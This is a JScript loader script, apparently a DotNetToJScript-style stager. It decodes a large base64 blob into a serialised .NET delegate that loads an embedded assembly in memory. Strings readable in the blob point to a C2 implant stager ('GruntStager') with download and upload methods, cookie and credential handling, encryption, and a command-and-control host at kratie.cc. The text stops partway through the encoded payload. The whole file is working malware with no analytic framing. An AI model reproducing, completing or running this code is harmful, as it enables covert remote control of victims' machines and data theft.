function toStream(bytes) {
    var encoder = new ActiveXObject("System.Text.ASCIIEncoding");
    var length = encoder.GetByteCount_2(bytes);
    var transformedBytes = encoder.GetBytes_4(bytes);
    var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
    transformedBytes = transform.TransformFinalBlock(transformedBytes, 0, length);
    var stream = new ActiveXObject("System.IO.MemoryStream");
    stream.Write(transformedBytes, 0, (length / 4) * 3);
    stream.Position = 0;
    return stream;
}


var assembly_str = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyBAAA"+
"AAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDAHbWV0aG9kMQMHAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFs"+
"aXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2Vy"+
"aWFsaXphdGlvbkhvbGRlci9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhv"+
"bGRlcgkCAAAACQMAAAAJBAAAAAkFAAAABAIAAAAwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhv"+
"bGRlcitEZWxlZ2F0ZUVudHJ5BwAAAAR0eXBlCGFzc2VtYmx5BnRhcmdldBJ0YXJnZXRUeXBlQXNzZW1i"+
"bHkOdGFyZ2V0VHlwZU5hbWUKbWV0aG9kTmFtZQ1kZWxlZ2F0ZUVudHJ5AQECAQEBAzBTeXN0ZW0uRGVs"+
"ZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkGBgAAANoBU3lzdGVtLkNvbnZlcnRl"+
"cmAyW1tTeXN0ZW0uQnl0ZVtdLCBtc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0dXJlPW5ldXRy"+
"YWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODldLFtTeXN0ZW0uUmVmbGVjdGlvbi5Bc3Nl"+
"bWJseSwgbXNjb3JsaWIsIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlU"+
"b2tlbj1iNzdhNWM1NjE5MzRlMDg5XV0GBwAAAEttc2NvcmxpYiwgVmVyc2lvbj00LjAuMC4wLCBDdWx0"+
"dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPWI3N2E1YzU2MTkzNGUwODkGCAAAAAd0YXJnZXQwCQcA"+
"AAAGCgAAABpTeXN0ZW0uUmVmbGVjdGlvbi5Bc3NlbWJseQYLAAAABExvYWQJDAAAAA8DAAAAACQAAAJN"+
"WpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACA"+
"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"+
"Bm9TAAAKcu4GAHBvVAAACm9VAAAKb1YAAAoGb1MAAApy+AYAcG9UAAAKLBsHBm9TAAAKcvgGAHBvVAAA"+
"Cm9VAAAKb1YAAAoHKh4CewEAAAQqIgIDfQEAAAQqSgIoVwAACgJzWAAACigHAAAGKjoCKAYAAAYDBG9Z"+
"AAAKKgAAABMwAgAmAAAAAwAAEQIDKFoAAAp1FQAAAQoGLQgCAyhaAAAKKgYCKAYAAAZvWwAACgYqHgIo"+
"IwAACioeAigSAAAKKh4CKAYAAAoqAAATMAIAQAAAAAQAABEXCgJ7AgAABCwkAnsDAAAEcikAAHAoPQAA"+
"CiwSBG9cAAAKAnsDAAAEKDEAAAoKBgJ7BAAABF8sBg4EFv4BCgYqLnMQAAAGgAUAAAQqRigbAAAKAygS"+
"AAAKbzwAAAoqAABCU0pCAQABAAAAAAAMAAAAdjIuMC41MDcyNwAAAAAFAGwAAADEBgAAI34AADAHAAAU"+
"CQAAI1N0cmluZ3MAAAAARBAAAAQHAAAjVVMASBcAABAAAAAjR1VJRAAAAFgXAADIAgAAI0Jsb2IAAAAA"+
"AAAAAgAAAVcVogkJCgAAAPoBMwAWAAABAAAAQAAAAAYAAAAIAAAAEwAAABAAAABcAAAACQAAAAQAAAAB"+
"AAAAAQAAAAIAAAADAAAAAQAAAAMAAAAEAAAAAgAAAAAAIQQBAAAAAAAGAJICTQYGALICTQYGAH4CKwYP"+
"AG0GAAAGALAHUAQGAFACUAQGAFoA9QAGAIwEUAQKAEkGgggGAJMAgggGAFIFgggGADsBUAQfANkFAAAG"+
"ACYFUAQOAHkDOAcOANgHvgcGAGMCTQYOALEFvgcOAJ0DUAQOADIIvgcOACAIvgcGADkCmAYOAMwEmAYO"+
"AHwHzAgKAHwAUAQGAE0FUAQGAGgDUAQKALsBQQUGAEwA9QAGAOIHUAQGALUEUAQGABgIUAQGAFcEgggG"+
"AI0BgggGAIEBgggGAG4HgggGAPkCTQgGAGoEgggGAKQEgggGAH4EgggOAHkFvgcOAPcBvgcOAKUDzAgO"+
"APQIvgcOAKQBvgcOAAUEvgcOANoGvgcOABIFvgcOAO4EGQEGAMYBUAQGANgCUAQGAOQFgggGAHIFUAQG"+
"AGwIUAQGAJ8I3AQGAAcCUAQGADAF3AQGACAC3AQGANIBUAQGAMEFtgAOAGYIOAcOAAIFOAcOADsFOAcO"+
"ABgCOAcAAAAAqwAAAAAAAQABAAEAEACNBY0FFQABAAEAAgAQANMHAABBAAEABgCCARAAkwQAABUAAgAL"+
"AAMBEAAcAAAAFQACAA0AAyEQAPEAAAAVAAUADwABAEABUQIGAL0EVQIGAIsDWAIGAMAAVQI2AKcAWwIW"+
"AAEAXwIWADEAXwIWAGEAXwJQIAAAAACGGPoFBgABAF4gAAAAAJYAxwRnAgEAXiAAAAAAlgDQAm0CAgBo"+
"IAAAAACGABcEBgACAHgqAAAAAJYAMwJxAgIAliwAAAAAhgiZBXsCBACeLAAAAACBCK0FPgIEAKcsAAAA"+
"AIYY+gUGAAUAuiwAAAAAhgB8BisCBQDMLAAAAADEAC8INwIHAP4sAAAAAJYAqwQkAQgABi0AAAAAlgAR"+
"CMsACQAOLQAAAACGGPoFBgAKABgtAAAAAIMAgwCAAgoAZC0AAAAAkRgABm0CDgAOLQAAAACGGPoFBgAO"+
"AHAtAAAAAIMACgCkAQ4AcC0AAAAAgwA6AKQBDwBwLQAAAACDAGoApAEQAAAAAQDVBgAAAQDjAAAAAgCp"+
"BwAAAQDnAgAAAQChAwAAAgCHBgAAAQCTBwAAAQDPBgAAAQAnBgAAAQBrBQAAAgAMCAAAAwDWBAAABACM"+
"BwAAAQC0AAAAAQC0AAAAAQDIAAkA+gUBABEA+gUGABkA+gUKADEA+gUGAIkA+gUGACkA+gUGANkAzQdo"+
"AOEAPQhvAAwA+gWKAOEAtweQAPEA5AGtANkAYQGxAPkAMwK3AEEA+gUGAGEAOAG8ACkAXAPBANkAbwPF"+
"AAEBAgPLAEkASQLRAAkBeAHWAAkB7QLdAAkBegjkAAkB2AAGAFEA+gXkACEB+gUGAFkA+gXqACkBngDy"+
"ADEBUAP4ACkBxgb9AAkBFwYDATkB8QMJAUEBfwMSAdkAmwcZAQkBygAfAQEBEwMkAdkAogcqAUkBMgQx"+
"AVkB+gWKAEkByQM4AYEAFQc/AaEA/ghEAYEA6ghKAYEA4AhRAWkB9wZXAWEB5wZdARQA1gVqARwA7gd5"+
"ARQARwR+AdkAsgiEAZkA+gWKAYEAYgePAYkByQeVARQA+gebAUEASAifAYEAIgOkARwARAipAZEBKwIG"+
"ANkAogetAYEAMQOxACkBZQOzAdkAvgiEAQkB0QDkAAkBBwYDAVkABAi5AQkBcggfAaEBSQLBAaEBxgbk"+
"AKkBqAjHAbkBEAHUAbkBjwbcAcEBPgbjAdEBtAHqAdkBzAXxAXEAmAHBAHEAaQHBANkAmwf3AeEB2gGK"+
"AekB8AEIAtkALwcNAukB+gWKAekBeQMSAhQA+gUGAHkAVwcYAvEBRwQeAgEC3QLBABQAFQElAoEA+gUG"+
"AJEA+gUGAJEAfAYrAoEALwg3AqkArQU+ArEAPgPBACEAKwDBAi4ACwCQAi4AEwCZAi4AGwC4AkAAIwDB"+
"AqMAKwDBAsAAKwDBAsMAKwDBAuAAKwDBAhAA/gEyAkQCAwABAAAAsQWLAgIABgADAAEABwADAIMAZAFz"+
"AQSAAAAAAAAAAAAAAAAAAAAAAFkIAAACAAAAAAAAAAAAAABIAugAAAAAAAMABQAAAAAAAAAAAEgCDAIA"+
"AAAAAgAAAAAAAAAAAAAASAJQBAAAAAADAAIABAACAAUAAgAGAAIAEQB/ABUAqAAAAAAAADw+OV9fM18w"+
"ADxFeGVjTGV2ZWw+Yl9fM18wADw+Y19fRGlzcGxheUNsYXNzM18wADw+OV9fM18xADxFeGVjTGV2ZWw+"+
"Yl9fM18xAElFbnVtZXJhYmxlYDEATGlzdGAxADw+OV9fM18yADxFeGVjTGV2ZWw+Yl9fM18yAEZ1bmNg"+
"MgA8RXhlY0xldmVsPmJfXzMASE1BQ1NIQTI1NgBnZXRfVVRGOAA8PjkAPE1vZHVsZT4ASABTeXN0ZW0u"+
"SU8AVmFsQ2VyVABVAGdldF9JVgBzZXRfSVYAR2VuZXJhdGVJVgBkYXRhAG1zY29ybGliADw+YwBTeXN0"+
"ZW0uQ29sbGVjdGlvbnMuR2VuZXJpYwBMb2FkAEFkZABTeXN0ZW0uQ29sbGVjdGlvbnMuU3BlY2lhbGl6"+
"ZWQATmV3R3VpZAA8Q29va2llQ29udGFpbmVyPmtfX0JhY2tpbmdGaWVsZABSZXBsYWNlAGdldF9TdGFj"+
"a1RyYWNlAHNldF9Nb2RlAFBhZGRpbmdNb2RlAENpcGhlck1vZGUAZ2V0X01lc3NhZ2UAQ3JlZGVudGlh"+
"bENhY2hlAEludm9rZQBFbnVtZXJhYmxlAElEaXNwb3NhYmxlAENvbnNvbGUAV3JpdGVMaW5lAGdldF9O"+
"ZXdMaW5lAEVzY2FwZQBTZWN1cml0eVByb3RvY29sVHlwZQBTeXN0ZW0uQ29yZQBDYXB0dXJlAE1ldGhv"+
"ZEJhc2UARGlzcG9zZQBQYXJzZQBYNTA5Q2VydGlmaWNhdGUAQ3JlYXRlAFNUQVRocmVhZEF0dHJpYnV0"+
"ZQBDb21waWxlckdlbmVyYXRlZEF0dHJpYnV0ZQBEZWJ1Z2dhYmxlQXR0cmlidXRlAENvbXBpbGF0aW9u"+
"UmVsYXhhdGlvbnNBdHRyaWJ1dGUAUnVudGltZUNvbXBhdGliaWxpdHlBdHRyaWJ1dGUARXhlY3V0ZQBC"+
"eXRlAGdldF9WYWx1ZQB2YWx1ZQBzZXRfUGFkZGluZwBFbmNvZGluZwBGcm9tQmFzZTY0U3RyaW5nAFRv"+
"QmFzZTY0U3RyaW5nAERvd25sb2FkU3RyaW5nAFVwbG9hZFN0cmluZwBHZXRDZXJ0SGFzaFN0cmluZwBU"+
"b1htbFN0cmluZwBUb1N0cmluZwBHZXRTdHJpbmcAU3Vic3RyaW5nAE1hdGNoAENvbXB1dGVIYXNoAEVh"+
"c3lQZWFzeUNlcnRIYXNoAFVyaQB1cmkAUmVtb3RlQ2VydGlmaWNhdGVWYWxpZGF0aW9uQ2FsbGJhY2sA"+
"c2V0X1NlcnZlckNlcnRpZmljYXRlVmFsaWRhdGlvbkNhbGxiYWNrAFRyYW5zZm9ybUZpbmFsQmxvY2sA"+
"TmV0d29ya0NyZWRlbnRpYWwARXhlY0xldmVsAGlveWxtdXp5LmpudS5kbGwAc2V0X1NlY3VyaXR5UHJv"+
"dG9jb2wAZ2V0X0l0ZW0AU3lzdGVtAFN5bW1ldHJpY0FsZ29yaXRobQBBc3ltbWV0cmljQWxnb3JpdGht"+
"AEhhc2hBbGdvcml0aG0AUmFuZG9tAE1lc3NhZ2VUcmFuc2Zvcm0ASUNyeXB0b1RyYW5zZm9ybQBCb29s"+
"ZWFuAFVzQ2VydFBpbgBNYWluAFg1MDlDaGFpbgBjaGFpbgBTeXN0ZW0uUmVmbGVjdGlvbgBOYW1lVmFs"+
"dWVDb2xsZWN0aW9uAEdyb3VwQ29sbGVjdGlvbgBXZWJIZWFkZXJDb2xsZWN0aW9uAEV4Y2VwdGlvbgBN"+
"ZXRob2RJbmZvAEdyb3VwAFN5c3RlbS5MaW5xAENoYXIAUlNBQ3J5cHRvU2VydmljZVByb3ZpZGVyAHNl"+
"bmRlcgBCdWZmZXIAU2VydmljZVBvaW50TWFuYWdlcgBHcnVudFN0YWdlcgBnZXRfQ29va2llQ29udGFp"+
"bmVyAHNldF9Db29raWVDb250YWluZXIAVGV4dFdyaXRlcgBnZXRfRXJyb3IAR2V0RW51bWVyYXRvcgBS"+
"YW5kb21OdW1iZXJHZW5lcmF0b3IALmN0b3IALmNjdG9yAENyZWF0ZURlY3J5cHRvcgBDcmVhdGVFbmNy"+
"eXB0b3IAc3RyAFN5c3RlbS5EaWFnbm9zdGljcwBHZXRNZXRob2RzAEFlcwBTeXN0ZW0uUnVudGltZS5D"+
"b21waWxlclNlcnZpY2VzAERlYnVnZ2luZ01vZGVzAFNldENvb2tpZXMAY29va2llcwBHZXRUeXBlcwBT"+
"eXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5Llg1MDlDZXJ0aWZpY2F0ZXMAR2V0Qnl0ZXMAYnl0ZXMA"+
"YXJncwBJQ3JlZGVudGlhbHMAc2V0X0NyZWRlbnRpYWxzAGdldF9EZWZhdWx0TmV0d29ya0NyZWRlbnRp"+
"YWxzAHNldF9Vc2VEZWZhdWx0Q3JlZGVudGlhbHMAQ29udGFpbnMAU3lzdGVtLlRleHQuUmVndWxhckV4"+
"cHJlc3Npb25zAGdldF9Hcm91cHMAZ2V0X0hlYWRlcnMAQ3NwUGFyYW1ldGVycwBTc2xQb2xpY3lFcnJv"+
"cnMAZXJyb3JzAGFkZHJlc3MAQ29uY2F0AEZvcm1hdABmb3JtYXQAT2JqZWN0AFNlbGVjdABTeXN0ZW0u"+
"TmV0AFNldABTcGxpdABPdHRvc1dlYkNsaWVudABFbnZpcm9ubWVudABnZXRfQ3VycmVudABnZXRfQ291"+
"bnQARGVjcnlwdABjZXJ0AEludmVydABDb252ZXJ0AEh0dHBXZWJSZXF1ZXN0AEdldFdlYlJlcXVlc3QA"+
"VG9MaXN0AE1vdmVOZXh0AFN5c3RlbS5UZXh0AGlveWxtdXp5LmpudQBSZWdleABBcnJheQBnZXRfS2V5"+
"AHNldF9LZXkAU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeQBBc3NlbWJseQBCbG9ja0NvcHkAb3Bf"+
"RXF1YWxpdHkAb3BfSW5lcXVhbGl0eQBTeXN0ZW0uTmV0LlNlY3VyaXR5AGdldF9Qcm94eQBzZXRfUHJv"+
"eHkASVdlYlByb3h5AGdldF9EZWZhdWx0V2ViUHJveHkAAAAAJ2gAdAB0AHAAOgAvAC8AawByAGEAdABp"+
"AGUALgBjAGMAOgA4ADAAAAEAM1YAWABOAGwAYwBpADEAQgBaADIAVgB1AGQAQQA9AD0ALABRADIAOQB2"+
"AGEAMgBsAGwAAIGbVABXADkANgBhAFcAeABzAFkAUwA4ADEATABqAEEAZwBLAEYAZABwAGIAbQBSAHYA"+
"ZAAzAE0AZwBUAGwAUQBnAE4AaQA0AHgASwBTAEIAQgBjAEgAQgBzAFoAVgBkAGwAWQBrAHQAcABkAEMA"+
"OAAxAE0AegBjAHUATQB6AFkAZwBLAEUAdABJAFYARQAxAE0ATABDAEIAcwBhAFcAdABsAEkARQBkAGwA"+
"WQAyAHQAdgBLAFMAQgBEAGEASABKAHYAYgBXAFUAdgBOAEQARQB1AE0AQwA0AHkATQBqAEkANABMAGoA"+
"QQBnAFUAMgBGAG0AWQBYAEoAcABMAHoAVQB6AE4AeQA0AHoATgBnAD0APQAsAFEAVgBOAFEAVQAwAFYA"+
"VABVADAAbABQAFQAawBsAEUAUABYAHQAQgBUAGsAOQBVAFMARQBWAFMAUwBVAFIAOQBPAHkAQgBUAFIA"+
"VgBOAFQAUwBVADkATwBTAFUAUQA5AE0AVABVADEATQBqAE0AegBNAGoAawAzAE0AVABjADEATQBBAD0A"+
"PQAAgJVMADIAVgB1AEwAWABWAHoATAAyAGwAdQBaAEcAVgA0AEwAbQBoADAAYgBXAHcAPQAsAEwAMgBW"+
"AHUATABYAFYAegBMADIAUgB2AFkAMwBNAHUAYQBIAFIAdABiAEEAPQA9ACwATAAyAFYAdQBMAFgAVgB6"+
"AEwAMwBSAGwAYwAzAFEAdQBhAEgAUgB0AGIAQQA9AD0AAICvaQA9AGEAMQA5AGUAYQAyADMAMAA2ADIA"+
"ZABiADkAOQAwADMAOAA2AGEAMwBhADQANwA4AGMAYgA4ADkAZAA1ADIAZQAmAGQAYQB0AGEAPQB7ADAA"+
"fQAmAHMAZQBzAHMAaQBvAG4APQA3ADUAZABiAC0AOQA5AGIAMQAtADIANQBmAGUANABlADkAYQBmAGIA"+
"ZQA1ADgANgA5ADYALQAzADIAMABiAGUAYQA3ADMAAQMKAACBPTwAaAB0AG0AbAA+AAoAIAAgACAAIAA8"+
"AGgAZQBhAGQAPgAKACAAIAAgACAAIAAgACAAIAA8AHQAaQB0AGwAZQA+AEkAdABzACAAbQBlACwAIABN"+
"AGEAcgBpAG8AIQA8AC8AdABpAHQAbABlAD4ACgAgACAAIAAgADwALwBoAGUAYQBkAD4ACgAgACAAIAAg"+
"ADwAYgBvAGQAeQA+AAoAIAAgACAAIAAgACAAIAAgADwAcAA+AEkAdABzACAAbQBlACwAIABNAGEAcgBp"+
"AG8AIQA8AC8AcAA+AAoAIAAgACAAIAAgACAAIAAgAC8ALwAgAEkAdABzACAAbQBlACwAIABNAGEAcgBp"+
"AG8AIQAgAHsAMAB9AAoAIAAgACAAIAA8AC8AYgBvAGQAeQA+AAoAPAAvAGgAdABtAGwAPgAAC2YAYQBs"+
"AHMAZQAAFTcAMwA5ADAAZgBjAGUAYwAzAGUAAAMtAAFZZwAwAGgAbgBkAEMAVQBoAFoAQwB4AFQAdgBI"+
"AFkARwBTAHYAcABuAHQAQgA4AFIATABCADIAZwBuAHMAbwBhAE0AUQAwAGEANQA3AE0AMQBRAFoAdwA9"+
"AACAqXsAewAiAEEATgBPAFQASABFAFIASQBEACIAOgAiAHsAMAB9ACIALAAiAFQAeQBwAGUAIgA6AHsA"+
"MQB9ACwAIgBNAGUAdABhACIAOgAiAHsAMgB9ACIALAAiAEkAVgAiADoAIgB7ADMAfQAiACwAIgBFAG4A"+
"YwBNAHMAZwAiADoAIgB7ADQAfQAiACwAIgBIAE0AQQBDACIAOgAiAHsANQB9ACIAfQB9AAADMAAADUMA"+
"bwBvAGsAaQBlAAADOwAAAywAABd7AEEATgBPAFQASABFAFIASQBEAH0AAAMxAAADMgAABVwAewAAA3sA"+
"AAV7AHsAAAV9AH0AAAN9AAAHewAwAH0AABcoAD8AJwBnAHIAcAAwACcALgAqACkAAQd7ADEAfQAAFygA"+
"PwAnAGcAcgBwADEAJwAuACoAKQABB3sAMgB9AAAXKAA/ACcAZwByAHAAMgAnAC4AKgApAAEHewAzAH0A"+
"ABcoAD8AJwBnAHIAcAAzACcALgAqACkAAQd7ADQAfQAAFygAPwAnAGcAcgBwADQAJwAuACoAKQABB3sA"+
"NQB9AAAXKAA/ACcAZwByAHAANQAnAC4AKgApAAEJZwByAHAAMAAACWcAcgBwADEAAAlnAHIAcAAyAAAJ"+
"ZwByAHAAMwAACWcAcgBwADQAAAlnAHIAcAA1AAAAANOaIJLztnFChb8NqukTV5IABCABAQgDIAABBSAB"+
"ARERVwcsEhQVEh0BDhUSHQEOFRIdAQ4VEh0BDg4OEiEODh0FDhIlEikSLR0FHQUdBQ4OEgwODg4OHQUd"+
"BR0FEiUdBR0FDh0FHQUdBQ4RMRURNQEODggICAgSOQYgAR0OHQMPEAEBFRIdAR4AFRJ1AR4AAwoBDgYV"+
"EmUCDg4FIAIBHBgXEAICFRJ1AR4BFRJ1AR4AFRJlAh4AHgEECgIODgMAAA4FIAIODg4EAAECDgQAABEx"+
"AyAADgUgAg4ICAUAAR0FDgQAABIlBiABARGAiQYgAQERgI0FIAEBHQUHIAIBCBKAkQUAABKAlQQgAQ4C"+
"BSABHQUOBSAAEoCdCCADHQUdBQgIBiABHQUdBQUAAg4ODgQgAB0FBQABDh0FBgACDg4dHAYAAQERgKkG"+
